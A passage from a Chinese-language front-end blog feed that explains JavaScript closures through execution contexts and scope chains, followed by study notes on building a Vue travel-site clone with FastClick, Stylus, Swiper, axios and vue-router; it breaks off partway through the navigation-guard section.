    <content type="html"><![CDATA[<blockquote><p>在学习前端的道路上，对很多知识点我们大多时候都是知其然而不知其所以然，当我们钻牛角尖去研究那些底层原理的时候，我们又容易迷失方向，不禁发出灵魂的拷问——“这个知识究竟有什么用处”，在拜读了某位大佬JS深入学习系列的专题文章后，我不由想要从其底层原理来讲讲闭包的实现过程，以此对闭包有更深入的理解。</p></blockquote><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var scope = &quot;global scope&quot;;</span><br><span class="line">function checkscope()&#123;</span><br><span class="line">    var scope = &quot;local scope&quot;;</span><br><span class="line">    function f()&#123;</span><br><span class="line">      return scope;</span><br><span class="line">    &#125;</span><br><span class="line">    return f;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var foo = checkscope();</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><p>首先，我们以上面这段代码，来看下其执行上下文的构建过程。</p><h2 id="执行上下文构建过程"><a href="#执行上下文构建过程" class="headerlink" title="执行上下文构建过程"></a>执行上下文构建过程</h2><p>执行全局代码，创建全局执行上下文，全局上下文被压入执行上下文栈。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ECStack = [</span><br><span class="line">  globalContext</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p><p>全局上下文初始化。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">globalContext = &#123;</span><br><span class="line">  VO: [global, scope, checkscope, foo],</span><br><span class="line">  Scope: [globalContext.VO],</span><br><span class="line">  this: globalContext.VO</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>初始化的同时，checkscope 函数被创建，保存作用域链到函数的内部属性[[scope]]。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checkscope.[[scope]] = [</span><br><span class="line">  globalContext.VO</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p><p>执行 checkscope 函数，创建 checkscope 函数执行上下文，checkscope 函数执行上下文被压入执行上下文栈。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ECStack = [</span><br><span class="line">  checkscopeContext,</span><br><span class="line">  globalContext</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p><p>checkscope 函数执行上下文初始化：</p><ul><li>复制函数 [[scope]] 属性创建作用域链，</li><li>用 arguments 创建活动对象，</li><li>初始化活动对象，即加入形参、函数声明、变量声明，</li><li>将活动对象压入 checkscope 作用域链顶端。</li><li>f 函数被创建，保存作用域链到 f 函数的内部属性[[scope]]</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">checkscopeContext = &#123;</span><br><span class="line">  AO: &#123;</span><br><span class="line">    arguments: &#123;</span><br><span class="line">      length: 0</span><br><span class="line">    &#125;,</span><br><span class="line">    scope: undefined,</span><br><span class="line">    f: reference to function f()&#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  Scope: [AO, globalContext.VO],</span><br><span class="line">  this: undefined</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checkscope 函数执行完毕，checkscope 执行上下文从执行上下文栈中弹出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ECStack = [</span><br><span class="line">  globalContext</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p><p>执行 f 函数，创建 f 函数执行上下文，f 执行上下文被压入执行上下文栈。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ECStack = [</span><br><span class="line">  fContext,</span><br><span class="line">  globalContext</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p><p>f 函数执行上下文初始化, 以下跟第 4 步相同：</p><ul><li>复制函数 [[scope]] 属性创建作用域链</li><li>用 arguments 创建活动对象</li><li>初始化活动对象，即加入形参、函数声明、变量声明</li><li>将活动对象压入 f 作用域链顶端</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fContext = &#123;</span><br><span class="line">  AO: &#123;</span><br><span class="line">    arguments: &#123;</span><br><span class="line">      length: 0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  Scope: [AO, checkscopeContext.AO, globalContext.VO],</span><br><span class="line">  this: undefined</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>f 函数执行，沿着作用域链查找 scope 值，返回 scope 值。<br>f 函数执行完毕，f 函数上下文从执行上下文栈中弹出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ECStack = [</span><br><span class="line">  globalContext</span><br><span class="line">];</span><br></pre></td></tr></table></figure></p><h2 id="闭包的定义"><a href="#闭包的定义" class="headerlink" title="闭包的定义"></a>闭包的定义</h2><p>现在我们再来看看 ECMAScript 中对闭包的定义。</p><h3 id="理论角度"><a href="#理论角度" class="headerlink" title="理论角度"></a>理论角度</h3><p>所有的函数。因为它们都在创建的时候就将上层上下文的数据保存起来了。哪怕是简单的全局变量也是如此，因为函数中访问全局变量就相当于是在访问自由变量，这个时候使用最外层的作用域。</p><h3 id="实践角度"><a href="#实践角度" class="headerlink" title="实践角度"></a>实践角度</h3><p>以下函数才算是闭包：</p><ul><li>即使创建它的上下文已经销毁，它仍然存在（比如，内部函数从父函数中返回）。</li><li>在代码中引用了自由变量。</li></ul><p>所以可见 f 的执行上下文维护了一个作用域链。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fContext = &#123;</span><br><span class="line">    Scope: [AO, checkscopeContext.AO, globalContext.VO]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在 checkscopeContext 被销毁的情况下，该作用域链依旧被保存了下来，形成了闭包。</p><h2 id="经典闭包例子分析"><a href="#经典闭包例子分析" class="headerlink" title="经典闭包例子分析"></a>经典闭包例子分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var data = [];</span><br><span class="line"></span><br><span class="line">for (var i = 0; i &lt; 3; i++) &#123;</span><br><span class="line">  data[i] = function () &#123;</span><br><span class="line">    console.log(i);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data[0]();  //3</span><br><span class="line">data[1]();  //3</span><br><span class="line">data[2]();  //3</span><br></pre></td></tr></table></figure><p>当执行到 data[0] 函数之前，此时全局上下文的 VO 为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">globalContext = &#123;</span><br><span class="line">  VO: &#123;</span><br><span class="line">    data: [...],</span><br><span class="line">    i: 3</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当执行 data[0] 函数的时候，data[0] 函数的作用域链为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data[0]Context = &#123;</span><br><span class="line">  Scope: [AO, globalContext.VO]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>data[0]Context 的 AO 并没有 i 值，所以会从 globalContext.VO 中查找，i 为 3，所以打印的结果就是 3。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var data = [];</span><br><span class="line"></span><br><span class="line">for (var i = 0; i &lt; 3; i++) &#123;</span><br><span class="line">  data[i] = (function (i) &#123;</span><br><span class="line">    return function()&#123;</span><br><span class="line">        console.log(i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data[0]();  //0</span><br><span class="line">data[1]();  //1</span><br><span class="line">data[2]();  //2</span><br></pre></td></tr></table></figure><p>当执行到 data[0] 函数之前，此时全局上下文的 VO 为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">globalContext = &#123;</span><br><span class="line">  VO: &#123;</span><br><span class="line">    data: [...],</span><br><span class="line">    i: 3</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当执行 data[0] 函数的时候，data[0] 函数的作用域链发生了改变：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data[0]Context = &#123;</span><br><span class="line">  Scope: [AO, 匿名函数Context.AO globalContext.VO]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>匿名函数执行上下文的 AO 为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">匿名函数Context = &#123;</span><br><span class="line">  AO: &#123;</span><br><span class="line">    arguments: &#123;</span><br><span class="line">      0: 0,</span><br><span class="line">      length: 1</span><br><span class="line">    &#125;,</span><br><span class="line">    i: 0</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>data[0]Context 的 AO 并没有 i 值，所以会沿着作用域链从匿名函数 Context.AO 中查找，这时候就会找 i 为 0，找到了就不会往 globalContext.VO 中查找了，即使 globalContext.VO 也有 i 的值(值为3)，所以打印的结果就是 0。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是对闭包的理解，那么学会了闭包，对我们的日常开发有什么用处呢，闭包在实际应用中最多的，就是用来实现函数柯里化，有关函数柯里化的知识可以参考我的另一篇文章<a href="http://dangoying.ink/%E5%87%BD%E6%95%B0%E6%9F%AF%E9%87%8C%E5%8C%96.html">函数柯里化</a></p><blockquote><p>参考链接：<a href="https://juejin.im/post/590159d8a22b9d0065c2d918" target="_blank" rel="noopener">JavaScript深入系列15篇（冴羽）</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;在学习前端的道路上，对很多知识点我们大多时候都是知其然而不知其所以然，当我们钻牛角尖去研究那些底层原理的时候，我们又容易迷失方向，不禁发出灵魂的拷问——“这个知识究竟有什么用处”，在拜读了某位大佬JS深入学习系列的专题文章后，我不由想要从其底层原理来讲讲闭包的实现过程，以此对闭包有更深入的理解。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>vue去哪儿项目学习笔记</title>
    <link href="http://dangoying.ink/vue%E5%8E%BB%E5%93%AA%E5%84%BF%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>http://dangoying.ink/vue去哪儿项目学习笔记.html</id>
    <published>2019-09-15T13:52:09.000Z</published>
    <updated>2019-09-18T15:46:01.858Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>借着每天零碎的时间，终于跟着某课网的视频完成了vue仿去哪儿的小项目，通过这个项目的练手，对vue和组件化开发有了更深入的理解，本文就来梳理下整个项目开发中那些值得思考和学习的知识。</p></blockquote><a id="more"></a><h2 id="项目启动流程"><a href="#项目启动流程" class="headerlink" title="项目启动流程"></a>项目启动流程</h2><p><img src="../assets/20190916/vue-start.jpg" alt="Alt text"></p><h2 id="多页应用-vs-单页应用"><a href="#多页应用-vs-单页应用" class="headerlink" title="多页应用 vs 单页应用"></a>多页应用 vs 单页应用</h2><h3 id="多页应用"><a href="#多页应用" class="headerlink" title="多页应用"></a>多页应用</h3><ul><li>解释：页面跳转，返回一个新的HTML文件</li><li>优点：首屏时间快，SEO效果好</li><li>缺点：页面切换慢</li></ul><h3 id="单页应用"><a href="#单页应用" class="headerlink" title="单页应用"></a>单页应用</h3><ul><li>解释：页面跳转，通过JS动态删除页面内容，再重新渲染</li><li>优点：页面切换快</li><li>缺点：首屏时间慢，SEO差</li></ul><h2 id="Fast-Click"><a href="#Fast-Click" class="headerlink" title="Fast Click "></a>Fast Click </h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>解决移动端点击300ms延迟的问题。</p><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><p>移动浏览器上支持的双击缩放操作，以及IOS Safari 上的双击滚动操作，是导致300ms的点击延迟主要原因。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>FastClick的实现原理是在检测到touchend事件的时候，会通过DOM自定义事件立即出发模拟一个click事件，并把浏览器在300ms之后真正的click事件阻止掉。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install fastclick --save</span><br><span class="line"></span><br><span class="line">//main.js</span><br><span class="line">import fastClick from &apos;fastclisk&apos;</span><br><span class="line">fastClick.attach(document.body)</span><br></pre></td></tr></table></figure><h3 id="不需要使用FastClick的情况"><a href="#不需要使用FastClick的情况" class="headerlink" title="不需要使用FastClick的情况"></a>不需要使用FastClick的情况</h3><ul><li>FastClick是不会对PC浏览器添加监听事件</li><li>Android版Chrome 32+浏览器，如果设置viewport meta的值为<code>width=device-width</code>，这种情况下浏览器会马上出发点击事件，不会延迟300毫秒。</li><li>所有版本的Android Chrome浏览器，如果设置viewport meta的值有user-scalable=no，浏览器也是会马上出发点击事件。</li><li>IE11+浏览器设置了css的属性<code>touch-action: manipulation</code>，它会在某些标签（a，button等）禁止双击事件，IE10的为-ms-touch-action: manipulation</li></ul><h2 id="Stylus-依赖包"><a href="#Stylus-依赖包" class="headerlink" title="Stylus 依赖包 "></a>Stylus 依赖包 </h2><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install stylus --save</span><br><span class="line">npm install stylus-loader --save</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;stylus&quot; scoped&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>可以使用缩进实现样式嵌套</li><li>可以使用变量</li><li>可以使用混合</li></ul><h2 id="vue-awesome-swiper-依赖包"><a href="#vue-awesome-swiper-依赖包" class="headerlink" title="vue-awesome-swiper 依赖包 "></a>vue-awesome-swiper 依赖包 </h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vue-awesome-swiper@2.6.7 --save</span><br></pre></td></tr></table></figure><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//main.js</span><br><span class="line">import VueAwesomeSwiper from &apos;vue-awesome-swiper&apos;</span><br><span class="line">import &apos;swiper/dist/css/swiper.css&apos;</span><br><span class="line"></span><br><span class="line">Vue.use(VueAwesomeSwiper)</span><br></pre></td></tr></table></figure><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><table><thead><tr><th style="text-align:left">Parameter</th><th style="text-align:left">Type</th><th style="text-align:left">Default</th><th style="text-align:left">Description</th></tr></thead><tbody><tr><td style="text-align:left">direction</td><td style="text-align:left">string</td><td style="text-align:left">‘horizontal’</td><td style="text-align:left">Could be ‘horizontal’ or ‘vertical’ (for vertical slider)</td></tr><tr><td style="text-align:left">speed</td><td style="text-align:left">number</td><td style="text-align:left">300</td><td style="text-align:left">Duration of transition between slides (in ms)</td></tr><tr><td style="text-align:left">loop</td><td style="text-align:left">boolean</td><td style="text-align:left">false</td><td style="text-align:left">Set to true to enable continuous loop mode</td></tr></tbody></table><h3 id="常用组件"><a href="#常用组件" class="headerlink" title="常用组件"></a>常用组件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pagination: &#123;</span><br><span class="line">  el: &apos;.swiper-pagination&apos;,</span><br><span class="line">  type: &apos;bullets&apos; </span><br><span class="line">  //Can be &quot;bullets&quot;, &quot;fraction&quot;, &quot;progressbar&quot; or &quot;custom&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><ul><li>当 swiper 包裹的元素为图片时，为了防止图片加载较慢导致的回流 (reflow) 现象，建议在 swiper 外加一层 div ，并提前为其设置宽高。</li><li>为了防止渲染的顺序与请求返回的数组顺序不一致，可以添加 <code>v-if</code> 条件，设置请求获得返回值时再进行页面渲染。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;wrapper&quot;&gt;</span><br><span class="line">  &lt;swiper :options=&quot;swiperOption&quot; v-if=&quot;showSwiper&quot;&gt;</span><br><span class="line">    &lt;!-- slides --&gt;</span><br><span class="line">    &lt;swiper-slide v-for=&quot;item of list&quot; :key=&quot;item.id&quot;&gt;</span><br><span class="line">        &lt;img class=&quot;swiper-img&quot; :src=&quot;item.imgUrl&quot; /&gt;</span><br><span class="line">    &lt;/swiper-slide&gt;</span><br><span class="line">    &lt;!-- Optional controls --&gt;</span><br><span class="line">    &lt;div class=&quot;swiper-pagination&quot;  slot=&quot;pagination&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/swiper&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">.wrapper</span><br><span class="line">  width: 100%</span><br><span class="line">  height: 0</span><br><span class="line">  overflow: hidden</span><br><span class="line">  padding-bottom: 26.5%</span><br></pre></td></tr></table></figure><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>当 <code>swpier</code> 包裹元素几期父元素存在隐藏后显示情况时，会导致 swiper 计算出错，为了解决这一问题可以在 <code>swiperOptions</code> 里添加两个属性。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">swiperOption: &#123;</span><br><span class="line">  pagination: &apos;.swiper-pagination&apos;,</span><br><span class="line">  paginationType: &apos;fraction&apos;,</span><br><span class="line">  observeParents: true,</span><br><span class="line">  observer: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>只要监听到该元素或其父元素DOM发生了变化，就会刷新页面，重新计算。</p><h2 id="Axios-获取数据"><a href="#Axios-获取数据" class="headerlink" title="Axios 获取数据"></a>Axios 获取数据</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install axios --save</span><br></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import axios from &apos;axios&apos;</span><br><span class="line"></span><br><span class="line">data () &#123;</span><br><span class="line">  return &#123;</span><br><span class="line">    lastCity: &apos;&apos;,</span><br><span class="line">    swiperList: [],</span><br><span class="line">    iconList: [],</span><br><span class="line">    recommendList: [],</span><br><span class="line">    weekendList: []</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line">    getHomeInfo () &#123;</span><br><span class="line">      axios.get(&apos;/api/index.json&apos;).then(this.getHomeInfoSucc)</span><br><span class="line">    &#125;,</span><br><span class="line">    getHomeInfoSucc (res) &#123;</span><br><span class="line">      res = res.data</span><br><span class="line">      if (res.ret &amp;&amp; res.data) &#123;</span><br><span class="line">        const data = res.data</span><br><span class="line">        this.swiperList = data.swiperList</span><br><span class="line">        this.iconList = data.iconList</span><br><span class="line">        this.recommendList = data.recommendList</span><br><span class="line">        this.weekendList = data.weekendList</span><br><span class="line">      &#125;</span><br><span class="line">      console.log(res)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted () &#123;</span><br><span class="line">    this.getHomeInfo()</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在开发环境，可以模拟从后端返回的json数据，在 <code>static/mock/</code> 目录下放模拟的 JSON 文件。并在 <code>config/index.js -&gt; ProxyTable</code> 中配置映射路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">proxyTable: &#123;</span><br><span class="line">  &apos;/api&apos;: &#123;</span><br><span class="line">    target: &apos;http://localhost:8080&apos;,</span><br><span class="line">    pathRewrite: &#123;</span><br><span class="line">      &apos;^/api&apos;: &apos;/static/mock&apos;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="vue-router"><a href="#vue-router" class="headerlink" title="vue-router"></a>vue-router</h2><h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p>单页面复应用 (SPA) 的核心就是前端路由。路由切换时，切换的是 <code>&lt;router-view&gt;</code> 挂载的组件，其他内容不会变化。</p><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install vue-router --save</span><br><span class="line"></span><br><span class="line">import VueRouter from &apos;vue-router&apos;</span><br><span class="line">Vue.use(VueRouter)</span><br></pre></td></tr></table></figure><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link to=&quot;/&quot;&gt;Go to Home&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">routes: [</span><br><span class="line">  &#123;</span><br><span class="line">    path: &apos;/&apos;,</span><br><span class="line">    name: &apos;Hello&apos;,</span><br><span class="line">    component: Hello</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="动态路由匹配"><a href="#动态路由匹配" class="headerlink" title="动态路由匹配"></a>动态路由匹配</h3><p>我们经常需要把某种模式匹配到的所有路由，全都映射到同个组件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">routes: [</span><br><span class="line">  &#123;</span><br><span class="line">    path: &apos;/detail/:id&apos;,</span><br><span class="line">    name: &apos;Detail&apos;,</span><br><span class="line">    component: Detail</span><br><span class="line">  &#125;</span><br><span class="line">],</span><br></pre></td></tr></table></figure></p><p>一个“路径参数”使用冒号 <code>:</code> 标记。当匹配到一个路由时，参数值会被设置到 <code>this.$route.params</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">params: &#123;</span><br><span class="line">  id: this.$route.params.id</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当使用路由参数时，例如从 <code>/user/foo</code> 导航到 <code>/user/bar</code>，原来的组件实例会被复用，这意味着组件的生命周期钩子不会再被调用。</p><p>复用组件时，想对路由参数的变化作出响应的话，你可以简单地 watch (监测变化) $route 对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const User = &#123;</span><br><span class="line">  template: &apos;...&apos;,</span><br><span class="line">  watch: &#123;</span><br><span class="line">    &apos;$route&apos; (to, from) &#123;</span><br><span class="line">      // 对路由变化作出响应...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>有时候，同一个路径可以匹配多个路由，此时，匹配的优先级就按照路由的定义顺序：谁先定义的，谁的优先级就最高。</p><h3 id="编程式的导航"><a href="#编程式的导航" class="headerlink" title="编程式的导航"></a>编程式的导航</h3><p>除了使用 <code>&lt;router-link&gt;</code> 创建 a 标签来定义导航链接，我们还可以借助 router 的实例方法，通过编写代码来实现。</p><ul><li>router.push(location, onComplete?, onAbort?)</li><li>router.replace(location, onComplete?, onAbort?)</li><li>router.go(n)</li></ul><h3 id="导航守卫"><a href="#导航守卫" class="headerlink" title="导航守卫"></a>导航守卫</h3><p>导航守卫主要用来通过跳转或取消的方式守卫导航。有多种机会植入路由导航过程中：全局的, 单个路由独享的, 或者组件级的。</p><h4 id="全局前置守卫"><a href="#全局前置守卫" class="headerlink" title="全局前置守卫"></a>全局前置守卫</h4><p>当一个导航触发时，全局前置守卫按照创建顺序调用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//main.js</span><br><span class="line">router.beforeEach((to, from, next) =&gt; &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>每个守卫方法接收三个参数：</p><ul><li>to: Route: 